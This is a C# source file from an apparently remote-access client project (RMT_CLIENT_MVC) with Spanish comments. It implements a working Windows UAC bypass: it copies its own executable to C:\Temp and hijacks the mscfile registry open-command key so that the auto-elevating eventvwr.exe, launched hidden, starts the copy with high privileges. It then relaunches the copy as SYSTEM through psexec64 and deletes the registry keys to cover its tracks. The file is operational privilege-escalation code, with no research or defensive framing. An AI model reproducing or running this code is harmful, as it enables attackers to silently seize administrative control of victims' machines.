using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using Microsoft.Win32;
using System.Linq;

namespace RMT_CLIENT_MVC
{
    public static class UacElevateManager
    {
        [DllImport("shell32.dll", SetLastError = true)]
        private static extern bool ShellExecuteEx(ref SHELLEXECUTEINFO lpExecInfo);

        [StructLayout(LayoutKind.Sequential)]
        private struct SHELLEXECUTEINFO
        {
            public int cbSize;
            public uint fMask;
            public IntPtr hwnd;
            [MarshalAs(UnmanagedType.LPTStr)]
            public string lpVerb;
            [MarshalAs(UnmanagedType.LPTStr)]
            public string lpFile;
            [MarshalAs(UnmanagedType.LPTStr)]
            public string lpParameters;
            [MarshalAs(UnmanagedType.LPTStr)]
            public string lpDirectory;
            public int nShow;
            public IntPtr hInstApp;
            public IntPtr lpIDList;
            [MarshalAs(UnmanagedType.LPTStr)]
            public string lpClass;
            public IntPtr hkeyClass;
            public uint dwHotKey;
            public IntPtr hIcon;
            public IntPtr hProcess;
        }

        private const uint SEE_MASK_NOCLOSEPROCESS = 0x00000040;
        private const string REG_KEY_PATH = "Software\\Classes\\mscfile\\shell\\open\\command";

        public static (string output, bool isError) ElevateUac()
        {
            try
            {
                string result = "Iniciando proceso de elevación UAC...\n\n";

                // Verificar archivos necesarios
                string strings64Path = @"C:\Temp\strings64.exe";
                string psexec64Path  = @"C:\Temp\psexec64.exe";

                if (!File.Exists(strings64Path) || !File.Exists(psexec64Path))
                {
                    string missingFiles = "Archivos necesarios no encontrados en C:\\Temp:\n";
                    if (!File.Exists(strings64Path)) missingFiles += "- strings64.exe\n";
                    if (!File.Exists(psexec64Path))  missingFiles += "- psexec64.exe\n";
                    missingFiles += "\nPor favor, carga estos archivos en C:\\Temp antes de ejecutar esta instrucción.";
                    return (missingFiles, true);
                }

                // Paso 1: Buscar eventvwr.exe
                result += "Buscando eventvwr.exe...\n";
                var whereProcess = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName        = "where",
                        Arguments       = "/r C:\\windows eventvwr.exe",
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        CreateNoWindow = true
                    }
                };
                whereProcess.Start();
                string whereOutput = whereProcess.StandardOutput.ReadToEnd();
                whereProcess.WaitForExit();

                // Verificar que eventvwr.exe exista
                if (string.IsNullOrWhiteSpace(whereOutput))
                {
                    return ("Error: No se encontró eventvwr.exe en C:\\Windows", true);
                }
                result += whereOutput + "\n";

                // Paso 2: Ejecutar strings64.exe sin pipe y filtrar en C#
                result += "\nAnalizando eventvwr.exe con strings64...\n";
                var stringsProcess = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = strings64Path,
                        Arguments = "-nobanner C:\\Windows\\System32\\eventvwr.exe",
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        CreateNoWindow = true
                    }
                };
                stringsProcess.Start();
                string stringsOutput = stringsProcess.StandardOutput.ReadToEnd();
                stringsProcess.WaitForExit();
                // Filtrar líneas que contengan 'autoelevate'
                var filtered = stringsOutput
                    .Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries)
                    .Where(line => line.IndexOf("autoelevate", StringComparison.OrdinalIgnoreCase) >= 0);
                result += string.Join("\n", filtered) + "\n";

                // Paso 3: Copiar el programa actual a C:\Temp
                string currentExe = Process.GetCurrentProcess().MainModule.FileName;
                string tempExe    = Path.Combine(@"C:\Temp", Path.GetFileName(currentExe));
                result += $"\nCopiando {currentExe} a {tempExe}...\n";
                File.Copy(currentExe, tempExe, true);
                result += "Copia completada\n";

                // Paso 4: Ejecutar bypass UAC
                result += "\nEjecutando bypass UAC...\n";
                ExecutePrivilegedCommand(tempExe);
                result += "Bypass UAC completado\n";

                // Paso 5: Ejecutar con psexec64
                result += "\nEjecutando con psexec64...\n";
                var psexecProcess = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName        = psexec64Path,
                        Arguments       = $"-i -accepteula -d -s \"{tempExe}\"",
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        CreateNoWindow  = true
                    }
                };
                psexecProcess.Start();
                string psexecOutput = psexecProcess.StandardOutput.ReadToEnd();
                psexecProcess.WaitForExit();
                result += psexecOutput + "\n";

                return (result, false);
            }
            catch (Exception ex)
            {
                return ($"Error durante la elevación UAC: {ex.Message}", true);
            }
        }

        private static bool DeleteRegistryKeys()
        {
            try
            {
                const string keyPath = "Software\\Classes\\mscfile";
                using (var parent = Registry.CurrentUser.OpenSubKey("Software\\Classes", true))
                {
                    if (parent != null && parent.OpenSubKey("mscfile") != null)
                    {
                        Registry.CurrentUser.DeleteSubKeyTree(keyPath);
                    }
                }
                return true;
            }
            catch (ArgumentException)
            {
                // Si la clave no existe, no hay nada que borrar
                return true;
            }
            catch
            {
                return false;
            }
        }

        private static void ExecutePrivilegedCommand(string binaryPath)
        {
            string eventViewerPath = Path.Combine(
                Environment.GetEnvironmentVariable("SYSTEMROOT"),
                "System32\\eventvwr.exe");

            // Intento limpiar claves del registro, ignorando errores si no existen
            DeleteRegistryKeys();

            try
            {
                using (var key = Registry.CurrentUser.CreateSubKey(REG_KEY_PATH))
                {
                    // Definimos exactamente el EXE copiado
                    key.SetValue("", $"\"{binaryPath}\"");
                }

                var execInfo = new SHELLEXECUTEINFO
                {
                    cbSize   = Marshal.SizeOf(typeof(SHELLEXECUTEINFO)),
                    lpVerb   = "open",
                    lpFile   = eventViewerPath,
                    nShow    = 0,
                    fMask    = SEE_MASK_NOCLOSEPROCESS
                };

                if (ShellExecuteEx(ref execInfo))
                {
                    // Esperar un momento para que eventvwr.exe inicie
                    Thread.Sleep(5000);

                    if (execInfo.hProcess != IntPtr.Zero)
                    {
                        try { Process.GetProcessById((int)execInfo.hProcess)?.Kill(); }
                        catch { }
                    }
                }
            }
            finally
            {
                DeleteRegistryKeys();
            }
        }
    }
} 